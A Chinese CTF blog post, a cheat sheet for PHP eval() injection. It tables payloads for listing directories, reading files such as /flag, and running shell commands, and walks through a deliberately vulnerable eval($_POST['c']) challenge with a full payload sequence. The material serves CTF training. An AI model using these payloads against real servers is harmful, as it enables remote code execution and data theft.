@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>eval() 注入速查表 | 菜菜のblog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saisi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saisi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">eval() 注入速查表</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 6, 2026&nbsp;&nbsp;12:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="一、找文件"><a href="#一、找文件" class="headerlink" title="一、找文件"></a>一、找文件</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>scandir()</code></td>
+<td><code>print_r(scandir(&#39;/&#39;));</code></td>
+<td>列出目录下所有文件和文件夹</td>
+</tr>
+<tr>
+<td><code>glob()</code></td>
+<td><code>print_r(glob(&#39;/f*&#39;));</code></td>
+<td>通配符搜索文件路径</td>
+</tr>
+<tr>
+<td><code>var_dump()</code></td>
+<td><code>var_dump(scandir(&#39;/&#39;));</code></td>
+<td>带类型地打印数组</td>
+</tr>
+</tbody></table>
+<p><strong>当 <code>print_r()</code> 和 <code>var_dump()</code> 都被禁时，用 <code>json_encode()</code> 或 <code>implode()</code> 输出数组：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>json_encode()</code></td>
+<td><code>echo json_encode(scandir(&#39;/&#39;));</code></td>
+<td>JSON 格式输出数组，清晰易读</td>
+</tr>
+<tr>
+<td><code>implode()</code></td>
+<td><code>echo implode(&#39; &#39;, scandir(&#39;/&#39;));</code></td>
+<td>空格分隔拼接数组元素</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h2 id="二、读文件"><a href="#二、读文件" class="headerlink" title="二、读文件"></a>二、读文件</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file_get_contents()</code></td>
+<td><code>echo file_get_contents(&#39;/flag&#39;);</code></td>
+<td>读整个文件成字符串</td>
+</tr>
+<tr>
+<td><code>file()</code></td>
+<td><code>print_r(file(&#39;/flag&#39;));</code></td>
+<td>读文件成数组，每行一个元素</td>
+</tr>
+<tr>
+<td><code>highlight_file()</code></td>
+<td><code>highlight_file(&#39;/flag&#39;);</code></td>
+<td>语法高亮显示文件源码</td>
+</tr>
+<tr>
+<td><code>show_source()</code></td>
+<td><code>show_source(&#39;/flag&#39;);</code></td>
+<td>同 highlight_file</td>
+</tr>
+<tr>
+<td><code>readfile()</code></td>
+<td><code>readfile(&#39;/flag&#39;);</code></td>
+<td>读文件直接输出</td>
+</tr>
+<tr>
+<td><code>fopen()+fgets()</code></td>
+<td><code>$f=fopen(&#39;/flag&#39;,&#39;r&#39;); while(!feof($f)) echo fgets($f);</code></td>
+<td>逐行读取</td>
+</tr>
+<tr>
+<td><code>fopen()+fread()</code></td>
+<td><code>echo fread(fopen(&#39;/flag&#39;,&#39;r&#39;), filesize(&#39;/flag&#39;));</code></td>
+<td>指定长度读取</td>
+</tr>
+<tr>
+<td><code>include()</code></td>
+<td><code>include(&#39;/flag&#39;);</code></td>
+<td>包含文件（PHP文件会执行，读源码需配合 php:&#x2F;&#x2F;filter）</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td><code>echo file_get_contents(&#39;php://filter/read=convert.base64-encode/resource=/flag&#39;);</code></td>
+<td>base64编码读取，绕过PHP解析</td>
+</tr>
+</tbody></table>
+<h2 id="三、执行命令（如果没被禁用）"><a href="#三、执行命令（如果没被禁用）" class="headerlink" title="三、执行命令（如果没被禁用）"></a>三、执行命令（如果没被禁用）</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>system()</code></td>
+<td><code>system(&#39;ls /&#39;);</code></td>
+<td>执行命令，直接输出结果</td>
+</tr>
+<tr>
+<td><code>exec()</code></td>
+<td><code>echo exec(&#39;ls /&#39;);</code></td>
+<td>执行命令，返回最后一行</td>
+</tr>
+<tr>
+<td><code>shell_exec()</code></td>
+<td><code>echo shell_exec(&#39;ls /&#39;);</code></td>
+<td>执行命令，返回完整输出</td>
+</tr>
+<tr>
+<td><code>passthru()</code></td>
+<td><code>passthru(&#39;ls /&#39;);</code></td>
+<td>执行命令，原始输出（适合二进制）</td>
+</tr>
+<tr>
+<td><code>popen()</code></td>
+<td><code>while($l=fread(popen(&#39;ls /&#39;,&#39;r&#39;),1024)) echo $l;</code></td>
+<td>单向外壳</td>
+</tr>
+</tbody></table>
+<h2 id="四、查看-PHP-配置"><a href="#四、查看-PHP-配置" class="headerlink" title="四、查看 PHP 配置"></a>四、查看 PHP 配置</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>phpinfo()</code></td>
+<td><code>phpinfo();</code></td>
+<td>查看所有 PHP 配置，包括禁用函数（disable_functions）</td>
+</tr>
+<tr>
+<td><code>get_defined_functions()</code></td>
+<td><code>print_r(get_defined_functions());</code></td>
+<td>列出所有可用函数</td>
+</tr>
+</tbody></table>
+<h2 id="五、典型探索流程"><a href="#五、典型探索流程" class="headerlink" title="五、典型探索流程"></a>五、典型探索流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 1. 看根目录（print_r/var_dump 被禁时用 json_encode 或 implode）</span><br><span class="line">echo json_encode(scandir(&#x27;/&#x27;));</span><br><span class="line">echo implode(&#x27; &#x27;, scandir(&#x27;/&#x27;));</span><br><span class="line"></span><br><span class="line"># 2. 一层层往下翻</span><br><span class="line">echo json_encode(scandir(&#x27;/var/&#x27;));</span><br><span class="line">echo json_encode(scandir(&#x27;/var/www/&#x27;));</span><br><span class="line">echo json_encode(scandir(&#x27;/var/www/html/&#x27;));</span><br><span class="line"></span><br><span class="line"># 3. 发现 flag.php，读它（按优先级试）</span><br><span class="line">echo file_get_contents(&#x27;/var/www/html/flag.php&#x27;);          # 首选</span><br><span class="line">highlight_file(&#x27;/var/www/html/flag.php&#x27;);                  # 备选</span><br><span class="line">include(&#x27;/var/www/html/flag.php&#x27;); echo $flag;             # 备选（PHP文件）</span><br><span class="line">include(&#x27;/flag.txt&#x27;);                                      # 备选（纯文本文件）</span><br><span class="line">echo file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&#x27;);  # 最后选</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、实战案例"><a href="#六、实战案例" class="headerlink" title="六、实战案例"></a>六、实战案例</h2><h3 id="题目：无过滤-eval-，但-system-被禁用"><a href="#题目：无过滤-eval-，但-system-被禁用" class="headerlink" title="题目：无过滤 eval()，但 system() 被禁用"></a>题目：无过滤 eval()，但 system() 被禁用</h3><p><strong>源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤，参数是 <code>$_POST[&#39;c&#39;]</code>，<code>eval()</code> 执行任意 PHP 代码。但执行命令时会发现 <code>system()</code> 被禁用了。</p>
+<h3 id="探索过程"><a href="#探索过程" class="headerlink" title="探索过程"></a>探索过程</h3><p><strong>Step 1：看根目录</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; .dockerenv</span><br><span class="line">    [3] =&gt; bin</span><br><span class="line">    [4] =&gt; dev</span><br><span class="line">    [5] =&gt; etc</span><br><span class="line">    [6] =&gt; home</span><br><span class="line">    [7] =&gt; lib</span><br><span class="line">    [8] =&gt; media</span><br><span class="line">    [9] =&gt; mnt</span><br><span class="line">    [10] =&gt; opt</span><br><span class="line">    [11] =&gt; proc</span><br><span class="line">    [12] =&gt; root</span><br><span class="line">    [13] =&gt; run</span><br><span class="line">    [14] =&gt; sbin</span><br><span class="line">    [15] =&gt; srv</span><br><span class="line">    [16] =&gt; sys</span><br><span class="line">    [17] =&gt; tmp</span><br><span class="line">    [18] =&gt; usr</span><br><span class="line">    [19] =&gt; var</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2：找到网站目录</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/var/www/html/&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; flag.php</span><br><span class="line">    [3] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3：读 flag</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>file_get_contents</code> 也被禁了，换：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整-Payload-序列"><a href="#完整-Payload-序列" class="headerlink" title="完整 Payload 序列"></a>完整 Payload 序列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 1. 看根目录</span><br><span class="line">POST /  →  c=print_r(scandir(&#x27;/&#x27;));</span><br><span class="line"></span><br><span class="line"># 2. 看网站目录</span><br><span class="line">POST /  →  c=print_r(scandir(&#x27;/var/www/html/&#x27;));</span><br><span class="line"></span><br><span class="line"># 3. 读 flag 文件</span><br><span class="line">POST /  →  c=echo file_get_contents(&#x27;/var/www/html/flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、常见问题"><a href="#七、常见问题" class="headerlink" title="七、常见问题"></a>七、常见问题</h2><table>
+<thead>
+<tr>
+<th>错误写法</th>
+<th>错误原因</th>
+<th>正确写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo file_get_contents(&#39;/flag*&#39;)</code></td>
+<td><code>file_get_contents</code> 不支持 <code>*</code> 通配符</td>
+<td>必须写完整路径</td>
+</tr>
+<tr>
+<td><code>scandir(&#39;/var/www/html/flag.php/&#39;)</code></td>
+<td><code>flag.php</code> 是文件不是目录，末尾不能加 <code>/</code></td>
+<td><code>scandir(&#39;/var/www/html/&#39;)</code></td>
+</tr>
+<tr>
+<td><code>echo file_get_contents(&#39;/var/www/html/flag.php&#39;)</code></td>
+<td>少了分号 <code>;</code></td>
+<td><code>echo file_get_contents(&#39;/var/www/html/flag.php&#39;);</code></td>
+</tr>
+</tbody></table>
+<h2 id="八、scandir-怎么看目录结构"><a href="#八、scandir-怎么看目录结构" class="headerlink" title="八、scandir() 怎么看目录结构"></a>八、<code>scandir()</code> 怎么看目录结构</h2><p><code>scandir()</code> 返回一个数组，每个元素就是该目录下的一个条目（文件或文件夹名）。就是 Linux 里 <code>ls -la</code> 的效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/                   ← scandir(&#x27;/&#x27;) 看这一层</span><br><span class="line">├── .dockerenv</span><br><span class="line">├── bin/</span><br><span class="line">├── dev/</span><br><span class="line">├── ...</span><br><span class="line">├── var/            ← 看到 var/，继续 scandir(&#x27;/var/&#x27;)</span><br><span class="line">│   └── www/</span><br><span class="line">│       └── html/</span><br><span class="line">│           ├── flag.php    ← 看到 flag.php，用 file_get_contents 读</span><br><span class="line">│           └── index.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>通俗理解：</strong> <code>scandir()</code> 就像在终端里 <code>ls</code> 一个目录，<code>file_get_contents()</code> 就像 <code>cat</code> 一个文件。<code>system()</code> 被禁了没关系，PHP 自己的文件操作函数一样能读文件。</p>
+<h2 id="九、关于-include-的特别说明"><a href="#九、关于-include-的特别说明" class="headerlink" title="九、关于 include() 的特别说明"></a>九、关于 <code>include()</code> 的特别说明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/var/www/html/flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>如果 flag.php 是纯 PHP 代码（里面有 <code>&lt;?php ... ?&gt;</code>），<code>include()</code> 会<strong>执行它</strong>，把 flag 变量设置到当前作用域，但不会直接显示。要配合：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>); <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果想读源码而不是执行，用 <code>php://filter</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://cai-cai-jun.github.io/2026/09/06/eval%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/">https://cai-cai-jun.github.io/2026/09/06/eval%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/PHP/"># PHP</a>
+                    
+                        <a href="/tags/eval/"># eval</a>
+                    
+                        <a href="/tags/%E6%B3%A8%E5%85%A5/"># 注入</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/09/08/PHP%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">PHP输出缓冲绕过技巧（ob_start + header 绕过 body 过滤）</a>
+            
+            
+            <a class="next" rel="next" href="/2026/09/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8/">命令执行绕过技巧大全</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
